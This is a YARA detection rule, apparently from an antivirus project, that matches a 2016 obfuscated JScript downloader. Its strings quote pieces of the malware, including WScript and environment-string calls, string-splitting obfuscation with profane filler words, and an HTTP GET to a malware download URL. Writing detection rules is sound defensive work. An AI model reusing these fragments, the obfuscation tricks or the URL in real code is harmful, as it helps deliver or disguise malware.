rule sig_20160428_4a9ea035214e267b8deafe40e5652ca6 {
  meta:
    description = "datamaliciousorder - file 20160428_4a9ea035214e267b8deafe40e5652ca6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "96461859e4162cfb7b98b1fb2759fbf38e7cbfedafee3b92e57447a6081e95dc"

  strings:
    $s1  = "function KwbHlcHldTcvTvyBbiZoq(LqqJuiHxlHunMztUfaBki){FmkDpgDwzZulJmpYimWzq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function JyoQqiUttJhtZgvAmtSfz() {return FmkDpgDwzZulJmpYimWzq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function KwbHlcHldTcvTvyBbiZoq(LqqJuiHxlHunMztUfaBki){FmkDpgDwzZulJmpYimWzq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var FmkDpgDwzZulJmpYimWzq = function NouXquIerVnvRdwQttMqc() {return KgqBxiTnmNjzIkeLdcFue[IhmTfyPfcOcmMbtRrwEsk](\"WScript\"+\"" ascii
    $s5  = "return BwqCjiJigOypTmiJcqYed - VxuZlaZetJheQmqIutCbj;};" fullword ascii
    $s6  = "function YqyDnmGpxNzlMxuFhdQyh(BwqCjiJigOypTmiJcqYed, VxuZlaZetJheQmqIutCbj){PonIbkAtcKbrYreFtzJee = PonIbkAtcKbrYreFtzJee * 1; " ascii
    $s7  = "SdxTjeNmiCchNztQzlCqz[VdaUjlJzvZbiOemFiyVyk](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var FmkDpgDwzZulJmpYimWzq = function NouXquIerVnvRdwQttMqc() {return KgqBxiTnmNjzIkeLdcFue[IhmTfyPfcOcmMbtRrwEsk](\"WScript\"+\"" ascii
    $s9  = "var KgqBxiTnmNjzIkeLdcFue = this[\"WScript\"];" fullword ascii
    $s10 = "function JyoQqiUttJhtZgvAmtSfz() {return FmkDpgDwzZulJmpYimWzq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function ArdWdfKusRvzMkhLysVuo(){return LlyVpyVaqBjkBwoFvrYxx + \"\";};" fullword ascii
    $s12 = "function YqyDnmGpxNzlMxuFhdQyh(BwqCjiJigOypTmiJcqYed, VxuZlaZetJheQmqIutCbj){PonIbkAtcKbrYreFtzJee = PonIbkAtcKbrYreFtzJee * 1; " ascii
    $s13 = "if (SdxTjeNmiCchNztQzlCqz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function BkcUefAasEaqBvcBykYeq() {return ((YyxDrsMeuTsgWhdPvmToe == true) && (YyxDrsMeuTsgWhdPvmToe == DckVfjOhaLlxFtnFntGzh)) ?" ascii
    $s15 = "function BhdUbbVfrKcmDpgRycYez(UdvSkcVnwTzeYfuOijSek) {var QzkUrxAfpCpyNsqUldOat = (1, 2, 3, 4, 5, UdvSkcVnwTzeYfuOijSek); retur" ascii
    $s16 = "function BkcUefAasEaqBvcBykYeq() {return ((YyxDrsMeuTsgWhdPvmToe == true) && (YyxDrsMeuTsgWhdPvmToe == DckVfjOhaLlxFtnFntGzh)) ?" ascii
    $s17 = "function BhdUbbVfrKcmDpgRycYez(UdvSkcVnwTzeYfuOijSek) {var QzkUrxAfpCpyNsqUldOat = (1, 2, 3, 4, 5, UdvSkcVnwTzeYfuOijSek); retur" ascii
    $s18 = "HucWtuMnuNlrRsgXxpEal = true;" fullword ascii
    $s19 = "function TmeWnlWwnJxmIbjOxxAgm(){return IhmTfyPfcOcmMbtRrwEsk;};" fullword ascii
    $s20 = "function HkfHmlRqdHxwBdgCnoIwf()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}